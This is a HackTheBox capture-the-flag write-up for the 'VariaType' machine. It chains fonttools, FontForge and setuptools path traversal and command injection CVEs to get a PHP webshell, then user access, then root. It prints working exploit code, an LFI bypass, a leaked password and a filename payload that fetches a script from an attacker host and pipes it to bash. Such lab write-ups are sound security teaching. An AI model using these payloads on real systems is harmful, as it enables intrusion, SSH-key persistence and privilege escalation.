<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>

﻿---
title: "HTB - VariaType"
date: 2026-05-05
tags: ["HackTheBox","Linux","Medium","CVE-2025-66034","fonttools","FontForge","PathTraversal","RCE"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/VariaType.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Medium |
| OS | Linux |
| CVEs | CVE-2025-66034 · CVE-2024-25082 · CVE-2025-47273 |

---

## Summary

VariaType is a Linux medium box centered around a typography company's web infrastructure. The attack chain involves **three distinct CVEs**:

- **CVE-2025-66034** - fonttools DesignSpace output path traversal → PHP webshell (`www-data`)
- **CVE-2024-25082** - FontForge archive filename command injection → SSH as `steve` (user)
- **CVE-2025-47273** - setuptools PackageIndex path traversal → SSH as `root`

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Recon | Nmap + vhost fuzzing + `.git` dump | - |
| 2 | Foothold | DesignSpace filename path traversal | CVE-2025-66034 |
| 3 | User (steve) | FontForge archive filename cmd injection | CVE-2024-25082 |
| 4 | Root | setuptools PackageIndex path traversal | CVE-2025-47273 |

---

## 01 - Reconnaissance

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -b 1500 -- -sV -sC
```

```
Port 22  OpenSSH 9.2p1
Port 80  nginx/1.22.1
```

### Virtual Host Discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://<TARGET_IP> -H "Host: FUZZ.variatype.htb" -fs <default_size>
# → portal.variatype.htb
```

### Git Repository Leak

```bash
curl -s http://portal.variatype.htb/.git/HEAD
# ref: refs/heads/master
```

Dumping the repository reveals hardcoded credentials in commit history:

```
5030e79  feat: initial portal  → $USERS = []
753b5f5  fix: add gitbot user  → 'gitbot' => 'G1tB0t_Acc3ss_2025!'
6f021da  security: remove creds → $USERS = []
```

**Credentials: `gitbot : G1tB0t_Acc3ss_2025!`**

### Reading app.py via LFI in portal

```bash
# download.php uses str_replace("../","") - bypass with ....//
curl -s -b cookies.txt \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//opt/variatype/app.py"
```

Key findings from `app.py`:
- Flask runs as the `variatype` user
- Runs: `subprocess.run(['fonttools','varLib','config.designspace'], cwd=workdir)`
- Output copied to `/var/www/portal.variatype.htb/public/files/`

---

## 02 - Initial Foothold: CVE-2025-66034 (www-data)

**Vulnerability:** When a `.designspace` file contains multiple `<variable-font>` elements, fonttools `varLib.main()` writes each output to `output_dir + variable_font.filename`. The `filename` attribute is **not sanitized**, allowing path traversal.

### Building the malicious fonts

```python
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen
import io

PHP = '<?php system($_GET["c"]); ?>'

def build_ttf(weight):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0,0)); pen.lineTo((500,0))
    pen.lineTo((500,500)); pen.lineTo((0,500))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500,0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": PHP, "styleName": f"W{weight}"})
    buf = io.BytesIO()
    fb.font.save(buf)
    return buf.getvalue()
```

### The malicious DesignSpace

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
  </axes>
  <sources>
    <source filename="src-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="src-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="Font1" filename="output.ttf">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
    <!-- PATH TRAVERSAL: write shell.php to portal webroot -->
    <variable-font name="Font2"
      filename="../../../var/www/portal.variatype.htb/public/shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

### Upload and confirm RCE

```python
session = requests.Session()
files = [
    ("designspace", ("exploit.designspace", designspace_xml, "application/xml")),
    ("masters", ("src-light.ttf", light_ttf, "font/ttf")),
    ("masters", ("src-regular.ttf", regular_ttf, "font/ttf")),
]
session.post("http://variatype.htb/tools/variable-font-generator/process", files=files)
```

```bash
curl -s "http://portal.variatype.htb/shell.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 03 - Privilege Escalation: www-data → steve

A cron job run as `steve` processes font files from the portal using FontForge. It accepts `.tar.gz` archives, and FontForge passes archive member filenames to `system()` without sanitization.

### CVE-2024-25082 - FontForge Archive Filename Command Injection

```python
import tarfile, io

malicious_name = "$(curl${IFS}<ATTACKER_IP>:8888/r.sh|bash).ttf"
with tarfile.open("/tmp/fontpack.tar.gz", "w:gz") as tar:
    data = b"dummy font data"
    info = tarfile.TarInfo(name=malicious_name)
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))
```

> **Note:** `${IFS}` replaces spaces (which would break the filename) with the Internal Field Separator.

### Payload (r.sh)

```bash
#!/bin/bash
mkdir -p /home/steve/.ssh
echo "<ATTACKER_SSH_PUBKEY>" >> /home/steve/.ssh/authorized_keys
chmod 700 /home/steve/.ssh
chmod 600 /home/steve/.ssh/authorized_keys
```

```bash
# Serve payload
python3 -m http.server 8888

# Upload archive via webshell
curl -s "http://portal.variatype.htb/shell.php?c=<url-encoded upload command>"
```

When steve's cron runs (~2 min interval), FontForge extracts the archive, executes the malicious filename:

```bash
ssh -i key steve@<TARGET_IP>
cat /home/steve/user.txt
```

---

## 04 - Privilege Escalation: steve → root

### Sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The script downloads a file from a user-supplied URL using `setuptools.package_index.PackageIndex.download()` and saves it to `/opt/font-tools/validators/`.

### CVE-2025-47273 - setuptools PackageIndex Path Traversal

`PackageIndex.download()` URL-decodes the path component before calling `os.path.join()`. When the decoded path starts with `/`, Python discards the base directory:

```python
os.path.join("/opt/font-tools/validators", "/root/.ssh/authorized_keys")
# → "/root/.ssh/authorized_keys"
```

By URL-encoding slashes as `%2F`, the URL passes validation (urlparse doesn't count `%2F` as `/`), but after decoding the path becomes absolute.

### The exploit

```bash
# Custom HTTP server that serves SSH pubkey for any request path
python3 - << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
PUBKEY = open("key.pub").read().strip() + "\n"
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", len(PUBKEY))
        self.end_headers()
        self.wfile.write(PUBKEY.encode())
HTTPServer(("0.0.0.0", 8888), H).serve_forever()
EOF

# Exploit
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://<ATTACKER_IP>:8888/%2Froot%2F.ssh%2Fauthorized_keys"
# [INFO] Plugin installed at: /root/.ssh/authorized_keys
```

```bash
ssh -i key root@<TARGET_IP>
cat /root/root.txt
```

---

## Attack Chain Summary

```
Internet
  ↓
variatype.htb (nginx:80)
  ├── portal.variatype.htb/.git → gitbot:G1tB0t_Acc3ss_2025!
  ├── Variable Font Generator
  │   └── CVE-2025-66034: DesignSpace filename path traversal
  │       └── Writes shell.php → RCE as www-data
  ├── www-data → steve
  │   └── CVE-2024-25082: FontForge archive filename injection
  │       └── Cron processes fontpack.tar.gz → SSH key written
  └── steve → root
      └── CVE-2025-47273: setuptools PackageIndex path traversal
          └── sudo install_validator.py writes to /root/.ssh/authorized_keys
```

---

## Key Takeaways

- **DesignSpace format 5.0** introduced `<variable-fonts>` with a `filename` attribute - when fonttools processes multiple entries it writes outputs using **unsanitized filenames**.
- **FontForge's archive handling** passes extracted filenames through `system()` without escaping - affects any workflow where untrusted archives are processed.
- **setuptools PackageIndex** URL-decodes paths before joining, and Python's `os.path.join()` silently discards the base when the second argument is absolute.
- **Clean up accumulated files** in shared directories - cron jobs processing files sequentially with timeouts can delay exploitation by hours.

---

## CVEs Referenced

| CVE ID | Component | Type | Description |
|--------|-----------|------|-------------|
| CVE-2025-66034 | fonttools | Path Traversal | DesignSpace filename output path traversal |
| CVE-2024-25082 | FontForge | Cmd Injection | Archive member filename command injection |
| CVE-2025-47273 | setuptools | Path Traversal | PackageIndex URL-decode path traversal |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| rustscan / nmap | Port scanning |
| ffuf | Virtual host fuzzing |
| git-dumper | Exposed `.git` repository extraction |
| curl | HTTP interaction |
| fontTools (Python) | Building malicious TTF master fonts |
| Python tarfile | Crafting archive with malicious filename |
| ssh / ssh-keygen | SSH key-based access |
| Custom Python HTTP server | Serving payloads to target |
